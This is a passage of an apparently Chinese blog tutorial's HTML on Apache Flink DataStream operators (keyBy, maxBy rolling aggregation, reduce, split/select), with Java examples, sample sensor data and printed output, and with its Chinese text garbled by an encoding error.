class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718209,32.8</span></span><br><span class="line"><span class="meta">map&gt;</span><span class="bash"> 24</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> sensor_1</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 1547718212</span></span><br><span class="line"><span class="meta">flatMap&gt;</span><span class="bash"> 37.1</span></span><br><span class="line"><span class="meta">filter&gt;</span><span class="bash"> sensor_1,1547718212,37.1</span></span><br></pre></td></tr></table></figure><h5 id="èšåˆæ“ä½œç®—å­"><a href="#èšåˆæ“ä½œç®—å­" class="headerlink" title="èšåˆæ“ä½œç®—å­"></a>èšåˆæ“ä½œç®—å­</h5><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108361376">Flink_Trasformç®—å­</a></p></blockquote><ul><li>DataStreamé‡Œæ²¡æœ‰reduceå’Œsumè¿™ç±»èšåˆæ“ä½œçš„æ–¹æ³•ï¼Œå› ä¸º<strong>Flinkè®¾è®¡ä¸­ï¼Œæ‰€æœ‰æ•°æ®å¿…é¡»å…ˆåˆ†ç»„æ‰èƒ½åšèšåˆæ“ä½œ</strong>ã€‚</li><li><strong>å…ˆkeyByå¾—åˆ°KeyedStreamï¼Œç„¶åè°ƒç”¨å…¶reduceã€sumç­‰èšåˆæ“ä½œæ–¹æ³•ã€‚ï¼ˆå…ˆåˆ†ç»„åèšåˆï¼‰</strong></li></ul><hr><p>å¸¸è§çš„èšåˆæ“ä½œç®—å­ä¸»è¦æœ‰ï¼š</p><ul><li> keyBy </li><li> æ»šåŠ¨èšåˆç®—å­Rolling Aggregation </li><li> reduce </li></ul><hr><h6 id="keyBy"><a href="#keyBy" class="headerlink" title="keyBy"></a>keyBy</h6><p><img src="https://img-blog.csdnimg.cn/20200902141943335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=XJhT8&originHeight=208&originWidth=628&originalType=binary&ratio=1&status=done&style=none"></p><p><strong>DataStream -&gt; KeyedStream</strong>ï¼šé€»è¾‘åœ°å°†ä¸€ä¸ªæµæ‹†åˆ†æˆä¸ç›¸äº¤çš„åˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºåŒ…å«å…·æœ‰ç›¸åŒkeyçš„å…ƒç´ ï¼Œåœ¨å†…éƒ¨ä»¥hashçš„å½¢å¼å®ç°çš„ã€‚</p><p>1ã€KeyByä¼šé‡æ–°åˆ†åŒºï¼›<br>2ã€ä¸åŒçš„keyæœ‰å¯èƒ½åˆ†åˆ°ä¸€èµ·ï¼Œå› ä¸ºæ˜¯é€šè¿‡hashåŸç†å®ç°çš„ï¼›</p><h6 id="Rolling-Aggregation"><a href="#Rolling-Aggregation" class="headerlink" title="Rolling Aggregation"></a>Rolling Aggregation</h6><p>è¿™äº›ç®—å­å¯ä»¥é’ˆå¯¹KeyedStreamçš„æ¯ä¸€ä¸ªæ”¯æµåšèšåˆã€‚</p><ul><li>sum()</li><li>min()</li><li>max()</li><li>minBy()</li><li>maxBy()</li></ul><hr><p>æµ‹è¯•maxByçš„javaä»£ç ä¸€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.KeyedStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 9:51 PM</span></span><br><span class="line"><span class="comment"> * æ»šåŠ¨èšåˆï¼Œæµ‹è¯•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest2_RollingAggregation</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œç¯å¢ƒå¹¶è¡Œåº¦è®¾ç½®1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(new MapFunction&lt;String, SensorReading&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public SensorReading map(String value) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//                String[] fields = value.split(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">//                return new SensorReading(fields[0],new Long(fields[1]),new Double(fields[2]));</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// å…ˆåˆ†ç»„å†èšåˆ</span></span><br><span class="line">        <span class="comment">// åˆ†ç»„</span></span><br><span class="line">        KeyedStream&lt;SensorReading, String&gt; keyedStream = sensorStream.keyBy(SensorReading::getId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ»šåŠ¨èšåˆï¼Œmaxå’ŒmaxByåŒºåˆ«åœ¨äºï¼ŒmaxByé™¤äº†ç”¨äºmaxæ¯”è¾ƒçš„å­—æ®µä»¥å¤–ï¼Œå…¶ä»–å­—æ®µä¹Ÿä¼šæ›´æ–°æˆæœ€æ–°çš„ï¼Œè€Œmaxåªæœ‰æ¯”è¾ƒçš„å­—æ®µæ›´æ–°ï¼Œå…¶ä»–å­—æ®µä¸å˜</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; resultStream = keyedStream.maxBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">        resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>sensor.txt</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p><em>ç”±äºæ˜¯æ»šåŠ¨æ›´æ–°ï¼Œæ¯æ¬¡è¾“å‡ºå†å²æœ€å¤§å€¼ï¼Œæ‰€ä»¥ä¸‹é¢36.3æ‰ä¼šå‡ºç°ä¸¤æ¬¡</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718212, temperature=37.1&#125;</span></span><br></pre></td></tr></table></figure><h6 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h6><pre><code>**Reduceé€‚ç”¨äºæ›´åŠ ä¸€èˆ¬åŒ–çš„èšåˆæ“ä½œåœºæ™¯**ã€‚javaä¸­éœ€è¦å®ç°`ReduceFunction`å‡½æ•°å¼æ¥å£ã€‚</code></pre><hr><pre><code>åœ¨å‰é¢Rolling Aggregationçš„å‰æä¸‹ï¼Œå¯¹éœ€æ±‚è¿›è¡Œä¿®æ”¹ã€‚è·å–åŒç»„å†å²æ¸©åº¦æœ€é«˜çš„ä¼ æ„Ÿå™¨ä¿¡æ¯ï¼ŒåŒæ—¶è¦æ±‚å®æ—¶æ›´æ–°å…¶æ—¶é—´æˆ³ä¿¡æ¯ã€‚</code></pre><p>javaä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.transform;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.KeyedStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.metrics.stats.Max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 10:14 PM</span></span><br><span class="line"><span class="comment"> * å¤æ‚åœºæ™¯ï¼Œé™¤äº†è·å–æœ€å¤§æ¸©åº¦çš„æ•´ä¸ªä¼ æ„Ÿå™¨ä¿¡æ¯ä»¥å¤–ï¼Œè¿˜è¦æ±‚æ—¶é—´æˆ³æ›´æ–°æˆæœ€æ–°çš„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest3_Reduce</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»º æ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œç¯å¢ƒå¹¶è¡Œåº¦è®¾ç½®1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DataStream&lt;SensorReading&gt; sensorStream = dataStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// å…ˆåˆ†ç»„å†èšåˆ</span></span><br><span class="line">        <span class="comment">// åˆ†ç»„</span></span><br><span class="line">        KeyedStream&lt;SensorReading, String&gt; keyedStream = sensorStream.keyBy(SensorReading::getId);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// reduceï¼Œè‡ªå®šä¹‰è§„çº¦å‡½æ•°ï¼Œè·å–maxæ¸©åº¦çš„ä¼ æ„Ÿå™¨ä¿¡æ¯ä»¥å¤–ï¼Œæ—¶é—´æˆ³è¦æ±‚æ›´æ–°æˆæœ€æ–°çš„</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; resultStream = keyedStream.reduce(</span><br><span class="line">                (curSensor,newSensor)-&gt;<span class="keyword">new</span> SensorReading(curSensor.getId(),newSensor.getTimestamp(), Math.max(curSensor.getTemperature(), newSensor.getTemperature()))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sensor.txt</code>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><p><em>å’Œå‰é¢â€œRolling Aggregationâ€å°èŠ‚ä¸åŒçš„æ˜¯ï¼Œå€’æ•°ç¬¬äºŒæ¡æ•°æ®çš„æ—¶é—´æˆ³ç”¨äº†å½“å‰æ¯”è¾ƒæ—¶æœ€æ–°çš„æ—¶é—´æˆ³ã€‚</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718207, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718209, temperature=36.3&#125;</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718212, temperature=37.1&#125;</span></span><br></pre></td></tr></table></figure><h5 id="å¤šæµè½¬æ¢ç®—å­"><a href="#å¤šæµè½¬æ¢ç®—å­" class="headerlink" title="å¤šæµè½¬æ¢ç®—å­"></a>å¤šæµè½¬æ¢ç®—å­</h5><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108361376">Flink_Trasformç®—å­</a></p></blockquote><p>å¤šæµè½¬æ¢ç®—å­ä¸€èˆ¬åŒ…æ‹¬ï¼š</p><ul><li> Splitå’ŒSelect ï¼ˆæ–°ç‰ˆå·²ç»ç§»é™¤ï¼‰ </li><li> Connectå’ŒCoMap </li><li> Union </li></ul><h6 id="Splitå’ŒSelect"><a href="#Splitå’ŒSelect" class="headerlink" title="Splitå’ŒSelect"></a>Splitå’ŒSelect</h6><p><strong>æ³¨ï¼šæ–°ç‰ˆFlinkå·²ç»ä¸å­˜åœ¨Splitå’ŒSelectè¿™ä¸¤ä¸ªAPIäº†ï¼ˆè‡³å°‘Flink1.12.1æ²¡æœ‰ï¼ï¼‰</strong></p><p>####### Split</p><p><img src="https://img-blog.csdnimg.cn/20200902194203248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=qz4Cx&originHeight=330&originWidth=664&originalType=binary&ratio=1&status=done&style=none"><br><strong>DataStream -&gt; SplitStream</strong>ï¼šæ ¹æ®æŸäº›ç‰¹å¾æŠŠDataStreamæ‹†åˆ†æˆSplitStream;</p><p><strong>SplitStreamè™½ç„¶çœ‹èµ·æ¥åƒæ˜¯ä¸¤ä¸ªStreamï¼Œä½†æ˜¯å…¶å®å®ƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„Stream</strong>;</p><p>####### Select</p><p><img src="https://img-blog.csdnimg.cn/20200902194442828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=QFc8X&originHeight=286&originWidth=696&originalType=binary&ratio=1&status=done&style=none"><br><strong>SplitStream -&gt; DataStream</strong>ï¼šä»ä¸€ä¸ªSplitStreamä¸­è·å–ä¸€ä¸ªæˆ–è€…å¤šä¸ªDataStream;</p><p><strong>æˆ‘ä»¬å¯ä»¥ç»“åˆsplit&amp;selectå°†ä¸€ä¸ªDataStreamæ‹†åˆ†æˆå¤šä¸ªDataStreamã€‚</strong></p><hr><p>æµ‹è¯•åœºæ™¯ï¼šæ ¹æ®ä¼ æ„Ÿå™¨æ¸©åº¦é«˜ä½ï¼Œåˆ’åˆ†æˆä¸¤ç»„ï¼Œhighå’Œlowï¼ˆ&gt;30å½’å…¥highï¼‰ï¼š</p><p><em>è¿™ä¸ªæˆ‘å‘ç°åœ¨Flinkå½“å‰æ—¶é—´æœ€æ–°ç‰ˆ1.12.1å·²ç»ä¸æ˜¯DataStreamçš„æ–¹æ³•äº†ï¼Œè¢«å»é™¤äº†</em></p><p>è¿™é‡Œç›´æ¥é™„ä¸Šæ•™ç¨‹ä»£ç ï¼ˆFlink1.10.1ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.apitest.transform;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2018-2028 å°šç¡…è°· All Rights Reserved</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Project: FlinkTutorial</span></span><br><span class="line"><span class="comment"> * Package: com.atguigu.apitest.transform</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Created by wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.atguigu.apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.collector.selector.OutputSelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.ConnectedStreams;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SplitStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.CoMapFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span>: TransformTest4_MultipleStreams</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: wushengran on 2020/11/7 16:14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformTest4_MultipleStreams</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;D:\\Projects\\BigData\\FlinkTutorial\\src\\main\\resources\\sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReading</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125; );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. åˆ†æµï¼ŒæŒ‰ç…§æ¸©åº¦å€¼30åº¦ä¸ºç•Œåˆ†ä¸ºä¸¤æ¡æµ</span></span><br><span class="line">    SplitStream&lt;SensorReading&gt; splitStream = dataStream.split(<span class="keyword">new</span> OutputSelector&lt;SensorReading&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> Iterable&lt;String&gt; <span class="title">select</span><span class="params">(SensorReading value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (value.getTemperature() &gt; <span class="number">30</span>) ? Collections.singletonList(<span class="string">&quot;high&quot;</span>) : Collections.singletonList(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    DataStream&lt;SensorReading&gt; highTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">    DataStream&lt;SensorReading&gt; lowTempStream = splitStream.select(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">    DataStream&lt;SensorReading&gt; allTempStream = splitStream.select(<span class="string">&quot;high&quot;</span>, <span class="string">&quot;low&quot;</span>);</span><br><span class="line"></span><br><span class="line">    highTempStream.print(<span class="string">&quot;high&quot;</span>);</span><br><span class="line">    lowTempStream.print(<span class="string">&quot;low&quot;</span>);</span><br><span class="line">    allTempStream.print(<span class="string">&quot;all&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">high&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line">all &gt; SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">low &gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br><span class="line">all &gt; SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, 